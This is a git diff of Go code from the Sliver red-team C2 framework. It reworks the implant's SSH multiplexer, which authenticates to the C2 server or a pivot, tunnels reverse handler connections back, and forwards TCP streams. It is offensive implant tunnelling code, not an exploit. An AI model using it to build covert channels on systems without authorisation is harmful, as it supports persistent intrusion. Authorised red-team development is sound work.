@@ -26,9 +26,9 @@ import (
 	"crypto/sha256"
 	"encoding/base64"
 	"errors"
-	"net"
-
 	"fmt"
+	"io"
+	"net"
 	"sync"
 	"time"
 
@@ -36,6 +36,7 @@ import (
 	"golang.org/x/crypto/ssh"
 
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/sliver/constants"
 )
 
 var (
@@ -51,16 +52,76 @@ type Comm struct {
 	// Core
 	SessionID     uint32            // Any multiplexer's physical connection is tied to an implant.
 	RemoteAddress string            // The multiplexer may be tied to a pivoted implant.
-	sshConn       ssh.Conn          // SSH Connection, that we will mux
-	clientConfig  *ssh.ClientConfig // We are the talking to the C2 server.
-	serverConfig  *ssh.ServerConfig // We are the pivot of an implant
+	ssh           ssh.Conn          // SSH Connection, that we will mux
+	config        *ssh.ClientConfig // We are the talking to the C2 server.
 	fingerprint   string            // A key fingerprint to authenticate the server/pivot.
 
 	// Connection management
 	requests <-chan *ssh.Request   // Keep alive
 	inbound  <-chan ssh.NewChannel // Inbound mux requests
 	mutex    *sync.RWMutex         // Concurrency management.
-	pending  int
+	pending  int                   // Number of actively processed connections.
+}
+
+// InitClient - Sets up and start a SSH connection (multiplexer) around a logical connection/stream, or a Session RPC.
+func InitClient(conn net.Conn, key []byte) (ss io.ReadWriteCloser, err error) {
+	// Return if we don't have what we need.
+	if conn == nil {
+		return nil, errors.New("net.Conn is nil, cannot init Comm")
+	}
+
+	// New SSH multiplexer Comm
+	comm := &Comm{mutex: &sync.RWMutex{}}
+
+	// Pepare the SSH conn/security, and set keepalive policies/handlers.
+	err = comm.setupAuthClient(key, constants.SliverName)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("failed to setup SSH client connection: %s", err.Error())
+		// {{end}}
+		return nil, err
+	}
+
+	// {{if .Config.Debug}}
+	log.Printf("Initiating SSH client connection...")
+	// {{end}}
+
+	// We are the client of the C2 server here.
+	comm.ssh, comm.inbound, comm.requests, err = ssh.NewClientConn(conn, "", comm.config)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("failed to initiate SSH connection: %s", err.Error())
+		// {{end}}
+		return
+	}
+
+	go comm.serveRequests() // Serve pings & requests with keepalive policies.
+
+	Comms.Add(comm)                // Everything is up and running, register the mux.
+	go comm.handleServerIncoming() // Handle requests (pings) and incoming connections in the background.
+
+	return
+}
+
+// setupAuthClient - The Comm prepares SSH code and security details for a client connection.
+func (comm *Comm) setupAuthClient(key []byte, name string) (err error) {
+
+	// Private key is used to authenticate to the server/pivot.
+	signer, err := ssh.ParsePrivateKey(key)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("SSH failed to parse Private Key: %s", err.Error())
+		// {{end}}
+		return
+	}
+
+	comm.config = &ssh.ClientConfig{
+		User:            name,                                     // The user is the implant name.
+		Auth:            []ssh.AuthMethod{ssh.PublicKeys(signer)}, // Authenticate as the implant.
+		HostKeyCallback: comm.verifyServer,                        // Checks the key given by the server/pivot.
+	}
+
+	return
 }
 
 // verifyServer - Check the server's host key fingerprint. We have an exampled compiled in above.
@@ -90,13 +151,14 @@ func (comm *Comm) verifyServer(hostname string, remote net.Addr, key ssh.PublicK
 	return nil
 }
 
-// handleServerIncoming - Serves all outbound (server <- implant) and inbound (server -> implant) connections.
+// handleServerIncoming - Serves all inbound (server -> implant) connections.
 func (comm *Comm) handleServerIncoming() {
+	// At the end of this function the Comm will be closed, so we clean it up.
 	defer func() {
 		// {{if .Config.Debug}}
-		log.Printf("Closing SSH client connection (Mux remote addr: %s)...", comm.RemoteAddress)
+		log.Printf("Closing SSH client connection ...")
 		// {{end}}
-		err := comm.sshConn.Close()
+		err := comm.ssh.Close()
 		if err != nil {
 			// {{if .Config.Debug}}
 			log.Printf("Error closing SSH connection: %s", err.Error())
@@ -124,17 +186,6 @@ func (comm *Comm) handleServerInbound(ch ssh.NewChannel) {
 		// {{end}}
 		return
 	}
-	// Find the route for this connection.
-	route, found := Routes.Active[info.ID]
-	if !found {
-		err := ch.Reject(ssh.Prohibited, "NOID")
-		if err != nil {
-			// {{if .Config.Debug}}
-			log.Printf("rejected connection: no route found for ID %s)", info.ID)
-			// {{end}}
-			return
-		}
-	}
 
 	// Accept stream and five to route.
 	stream, reqs, err := ch.Accept()
@@ -148,53 +199,96 @@ func (comm *Comm) handleServerInbound(ch ssh.NewChannel) {
 	go ssh.DiscardRequests(reqs)
 
 	// Add conn stats.
-	route.pending++
 	comm.pending++
 	defer func() {
-		route.pending--
 		comm.pending--
 	}()
 
-	// The route will handle the stream (blocking)
-	routeForwardConn(route, info, stream)
+	// {{if .Config.Debug}}
+	log.Printf("Forwarding inbound stream: %s:%d --> %s:%d", info.LHost, info.LPort, info.RHost, info.RPort)
+	// {{end}}
+
+	// Depending on the Transport protocol, we handle the stream differently.
+	switch info.Transport {
+	case sliverpb.TransportProtocol_TCP:
+		err := dialTCP(info, stream)
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("Error dialing TCP: %s:%d -> %s:%d",
+				info.LHost, info.LPort, info.RHost, info.RPort)
+			// {{end}}
+			return
+		}
+	case sliverpb.TransportProtocol_UDP:
+		// If the connection is meant to forward UDP traffic, we have to spawn a new UDP handler.
+		// This is because the server will only send (through this stream) UDP traffic meant for
+		// the same destination and from the same source address.
+		// This is so that it is easier to reproduce a *net.UDPConn at the server's end, for
+		// supporting other application-level protocols like QUIC.
+
+	}
 }
 
-// func (m *Comm) handleServerOutbound(ch ssh.NewChannel) {
-//         if m.sshConn == nil {
-//                 // {{if .Config.Debug}}
-//                 log.Printf("Tried to open channel on nil SSH connection")
-//                 // {{end}}
-//                 return
-//         }
-//         dst, reqs, err := m.sshConn.OpenChannel("route", ch.ExtraData())
-//         if err != nil {
-//                 // {{if .Config.Debug}}
-//                 log.Printf("Failed to open Session RPC channel: %s", err.Error())
-//                 // {{end}}
-//                 ch.Reject(ssh.ConnectionFailed, err.Error())
-//                 return
-//         }
-//         go ssh.DiscardRequests(reqs)
-//         src, srcReqs, err := ch.Accept()
-//         if err != nil {
-//                 // {{if .Config.Debug}}
-//                 log.Printf("Failed to open Session RPC channel: %s", err.Error())
-//                 // {{end}}
-//                 return
-//         }
-//         go ssh.DiscardRequests(srcReqs)
-//
-//         // {{if .Config.Debug}}
-//         log.Printf("Piping connection stream.")
-//         // {{end}}
-//
-//         // Pipe output
-//         transport(src, dst)
-// }
+// handleReverse - A net.Conn and the info of its handler (a listener/dialer)
+// is passed to the implant comm and routed back to the server.
+func (comm *Comm) handleReverse(h *sliverpb.Handler, conn net.Conn) {
 
-// NumStreams - Return the number of connections going through this comm.
-func (comm *Comm) NumStreams() int {
-	return comm.pending
+	// Populate the connection info with all details from the handler struct:
+	// we assume all fields are good, otherwise the server/implant would have
+	// returned an error before spawing the listener/dialer.
+	info := &sliverpb.ConnectionInfo{
+		ID:          h.ID,
+		Transport:   h.Transport,
+		Application: h.Application,
+		LHost:       h.LHost,
+		LPort:       h.LPort,
+		RHost:       h.RHost,
+		RPort:       h.RPort,
+	}
+	data, _ := proto.Marshal(info)
+
+	// Create muxed channel and pipe, or close the connection if failure.
+	dst, reqs, err := comm.ssh.OpenChannel("handler", data)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Failed to open channel: %s", err.Error())
+		// {{end}}
+		err = conn.Close()
+		return
+	}
+	go ssh.DiscardRequests(reqs)
+
+	// Pipe the connection.
+	transport(conn, dst)
+}
+
+// getStream - A handler may request ahead a stream over which to transmit its data.
+// The ID given is mandatorily linked to a working abstracted listener on the server.
+func (comm *Comm) getStream(h *sliverpb.Handler) io.ReadWriteCloser {
+
+	// Populate the connection info
+	info := &sliverpb.ConnectionInfo{
+		ID:          h.ID,
+		Transport:   h.Transport,
+		Application: h.Application,
+		LHost:       h.LHost,
+		LPort:       h.LPort,
+		RHost:       h.RHost,
+		RPort:       h.RPort,
+	}
+	data, _ := proto.Marshal(info)
+
+	// Create muxed channel and return it
+	dst, reqs, err := comm.ssh.OpenChannel("handler", data)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Failed to open channel: %s", err.Error())
+		// {{end}}
+		return nil
+	}
+	go ssh.DiscardRequests(reqs)
+
+	return dst
 }
 
 // serverRequests - Handles all requests coming from the implant comm. (latency checks, close requests, etc.)
@@ -228,7 +322,7 @@ func (comm *Comm) serveRequests() {
 // checkLatency - get latency for this tunnel.
 func (comm *Comm) checkLatency() {
 	t0 := time.Now()
-	_, _, err := comm.sshConn.SendRequest("latency", true, []byte{})
+	_, _, err := comm.ssh.SendRequest("latency", true, []byte{})
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Could not check latency: %s", err.Error())
